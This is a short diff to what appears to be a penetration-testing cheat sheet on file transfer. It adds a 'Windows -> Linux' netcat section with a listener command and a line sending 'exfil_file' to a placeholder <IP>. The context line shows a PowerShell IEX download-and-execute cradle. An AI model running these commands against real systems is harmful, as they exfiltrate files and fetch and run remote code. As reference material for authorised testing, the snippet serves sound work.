@@ -93,4 +93,8 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$
 
 ## Windows -> Linux
 
-
+Netcat
+```
+nc -lvnp 4444 > new_file
+nc -vn <IP> 4444 < exfil_file
+```
